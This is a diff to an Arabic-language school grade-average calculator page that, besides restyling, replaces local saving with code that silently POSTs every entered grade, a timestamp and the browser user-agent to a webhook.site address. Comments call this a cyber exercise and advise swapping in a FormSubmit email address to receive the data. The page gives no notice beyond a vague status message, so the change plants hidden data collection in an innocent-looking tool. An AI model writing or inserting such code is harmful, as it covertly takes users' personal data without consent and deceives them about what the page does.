@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>haytam</title>
+    <title>حاسبة المعدلات - الطابع الداكن</title>
     <link href="https://fonts.googleapis.com/css2?family=Changa:wght@400;700;800&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
     
     <style>
-        /* التنسيقات (CSS) - تصميم داكن وجريء */
+        /* التنسيقات (CSS) - الوضع الداكن والجريء */
         :root {
-            --dark-bg: #1a1a2e; /* خلفية داكنة عميقة (كحلي غامق) */
-            --card-bg: #2c2c44; /* لون بطاقة أفتح قليلاً */
-            --neon-blue: #d4f1f1; /* أزرق سماوي نيون */
-            --neon-green: #38c172; /* أخضر نيون للنجاح */
-            --light-text: #f0f0f0; /* نص فاتح */
+            --dark-bg: #1a1a2e;
+            --card-bg: #2c2c44;
+            --neon-blue: #a6b5b7;
+            --neon-green: #38c172;
+            --light-text: #f0f0f0;
             --border-color: #4a4a6b; 
-            --reset-color: #ff6b6b; /* أحمر نيون للتحذير */
+            --reset-color: #ff6b6b;
         }
 
         body {
@@ -34,13 +34,13 @@
             background: var(--card-bg);
             padding: 40px;
             border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 15px rgba(0, 188, 212, 0.2); /* ظل عميق مع توهج أزرق خفيف */
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 15px rgba(0, 188, 212, 0.2);
             border: 1px solid var(--border-color);
         }
         h2 {
             text-align: center;
             color: var(--neon-blue);
-            text-shadow: 0 0 10px var(--neon-blue), 0 0 20px rgba(0, 188, 212, 0.5); /* تأثير الإضاءة النيون */
+            text-shadow: 0 0 10px var(--neon-blue), 0 0 20px rgba(0, 188, 212, 0.5);
             padding-bottom: 10px;
             margin-bottom: 10px;
             font-size: 2.8em;
@@ -71,13 +71,12 @@
             transition: background-color 0.3s;
         }
         th {
-            background-color: #3b3b5c; /* رأس الجدول داكن */
+            background-color: #3b3b5c;
             color: var(--neon-blue);
             font-weight: 700;
             font-size: 1.1em;
             border-color: #5c5c85;
         }
-        /* تلوين الصفوف بالتناوب للتباين */
         tbody tr:nth-child(odd) {
             background-color: #31314f;
         }
@@ -91,13 +90,13 @@
             text-align: right;
             font-weight: 600;
             color: var(--light-text);
-            background-color: #3b3b5c; /* تمييز خانة المادة */
+            background-color: #3b3b5c;
             padding-right: 15px;
         }
         input[type="text"] {
             width: 85%;
             padding: 10px 5px;
-            background-color: var(--dark-bg); /* حقول إدخال أغمق */
+            background-color: var(--dark-bg);
             color: var(--light-text);
             border: 1px solid var(--border-color);
             border-radius: 8px;
@@ -112,12 +111,12 @@
             outline: none;
         }
         .average-cell {
-            background-color: #2e5944; /* خلفية داكنة للأخضر النيون */
+            background-color: #2e5944;
             font-weight: 800;
             color: var(--neon-green);
             font-size: 1.25em;
             border-left: 3px solid var(--neon-green);
-            text-shadow: 0 0 5px rgba(56, 193, 114, 0.8); /* توهج على النتيجة */
+            text-shadow: 0 0 5px rgba(56, 193, 114, 0.8);
         }
         #result-box {
             background-color: #2e5944;
@@ -129,14 +128,13 @@
             text-align: center;
             margin-top: 40px;
             border: 2px solid var(--neon-green);
-            box-shadow: 0 0 25px rgba(56, 193, 114, 0.7); /* توهج قوي */
+            box-shadow: 0 0 25px rgba(56, 193, 114, 0.7);
         }
         .sub-header {
             background-color: #3b3b5c !important;
             color: var(--light-text);
             font-weight: 700;
         }
-        /* تنسيق زر إعادة الضبط */
         #reset-button {
             display: block;
             width: 300px;
@@ -149,7 +147,7 @@
             font-size: 1.2em;
             font-weight: 700;
             cursor: pointer;
-            box-shadow: 0 0 15px rgba(255, 107, 107, 0.7); /* توهج أحمر */
+            box-shadow: 0 0 15px rgba(255, 107, 107, 0.7);
             transition: all 0.3s;
         }
         #reset-button:hover {
@@ -157,8 +155,6 @@
             color: var(--dark-bg);
             box-shadow: 0 0 20px var(--reset-color);
         }
-        
-        /* تنسيق HAYTAM في الأسفل */
         .footer {
             text-align: center;
             margin-top: 50px;
@@ -167,10 +163,10 @@
             font-size: 1.2em;
             font-weight: 700;
             letter-spacing: 2px;
-            text-shadow: 0 0 8px var(--neon-blue); /* تأثير الإضاءة النيون */
+            text-shadow: 0 0 8px var(--neon-blue);
         }
         .footer strong {
-            font-family: 'Orbitron', sans-serif; /* خط رقمي/تقني للاسم */
+            font-family: 'Orbitron', sans-serif;
             font-size: 1.5em;
             color: var(--neon-blue);
         }
@@ -212,10 +208,12 @@
         <div id="result-box">
             المعدل العام النهائي: <span id="final-average">---</span>
         </div>
+        
+        <div id="status-message" style="text-align: center; margin-top: 20px; color: var(--neon-green); font-weight: bold;"></div>
     </div>
 
     <div class="footer">
-        <strong></strong>
+         <strong></strong>
     </div>
 
     <script>
@@ -232,8 +230,53 @@
         const finalAverageElement = document.getElementById('final-average');
         const numInputsPerSubject = 5; 
         const localStorageKey = 'gradesCalculatorData'; 
+        
+        // *****************************************************************
+        // ** التعديلات الرئيسية للتمرين السيبراني **
+        // *****************************************************************
+        
+        // 1. تحديد نقطة الإرسال (الخادم/الخدمة الوسيطة)
+        // **ملاحظة: استبدل هذا الرابط برابط خدمة إرسال بريد إلكتروني حقيقي (مثل FormSubmit) للحصول على البيانات في بريدك.**
+        // مثال FormSubmit: 'https://formsubmit.co/ajax/your-email@example.com' 
+        const SERVER_ENDPOINT = 'https://webhook.site/cb508de2-2f41-4364-a34f-9553e024d459'; // رابط وهمي/تجريبي
 
-        // دالة الحفظ التلقائي
+        // 2. دالة الإرسال (بدلاً من الحفظ المحلي)
+        async function sendGradesToServer(gradesData) {
+            document.getElementById('status-message').textContent = 'جاري إرسال البيانات...';
+            
+            // إضافة معلومات إضافية للمستخدم (مثل User-Agent)
+            const submissionData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent, // معلومات User-Agent
+                grades: gradesData
+            };
+            
+            try {
+                const response = await fetch(SERVER_ENDPOINT, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(submissionData)
+                });
+
+                if (response.ok) {
+                    // إذا نجح الإرسال، نحفظه محلياً ليراه المستخدم عند العودة
+                    localStorage.setItem(localStorageKey, JSON.stringify(gradesData));
+                    document.getElementById('status-message').textContent = 'تم حفظ العلامات وإرسالها بنجاح.';
+                } else {
+                    document.getElementById('status-message').textContent = 'تم حفظ العلامات محلياً. فشل الإرسال إلى الخادم (خطأ في الرابط).';
+                    // نحفظ محلياً في حالة فشل الإرسال
+                    localStorage.setItem(localStorageKey, JSON.stringify(gradesData));
+                }
+            } catch (error) {
+                document.getElementById('status-message').textContent = 'تم حفظ العلامات محلياً. فشل الاتصال بالخادم.';
+                 // نحفظ محلياً في حالة فشل الاتصال
+                localStorage.setItem(localStorageKey, JSON.stringify(gradesData));
+            }
+        }
+        
+        // 3. دالة الحفظ التلقائي (المعدلة لاستدعاء دالة الإرسال)
         function saveGrades() {
             const gradesData = {};
             subjects.forEach((subject, index) => {
@@ -243,8 +286,14 @@
                     gradesData[subject].push(inputElement.value);
                 }
             });
-            localStorage.setItem(localStorageKey, JSON.stringify(gradesData));
+            
+            // نرسل البيانات بدلاً من حفظها فقط!
+            sendGradesToServer(gradesData);
         }
+        
+        // *****************************************************************
+        // ** باقي الدوال (لا تغيير عليها) **
+        // *****************************************************************
 
         // دالة تحميل العلامات
         function loadGrades() {
@@ -267,7 +316,6 @@
         // دالة إعادة الضبط
         function resetGrades() {
             if (confirm("هل أنت متأكد من مسح جميع العلامات؟ سيتم مسح البيانات المحفوظة.")) {
-                // مسح جميع حقول الإدخال
                 subjects.forEach((subject, index) => {
                     for (let i = 0; i < numInputsPerSubject; i++) {
                         const inputElement = document.getElementById(`grade-${index}-${i}`);
@@ -277,12 +325,9 @@
                     }
                 });
 
-                // مسح البيانات من LocalStorage
                 localStorage.removeItem(localStorageKey);
-
-                // إعادة حساب المعدلات لتحديث الواجهة
                 calculateOverallAverage();
-
+                document.getElementById('status-message').textContent = '';
                 alert("تم إعادة ضبط جميع النقاط بنجاح!");
             }
         }
@@ -302,7 +347,7 @@
             }
             
             calculateOverallAverage();
-            saveGrades();
+            saveGrades(); // يتم استدعاء دالة الإرسال هنا
         }
 
         // دالة لحساب متوسط المادة
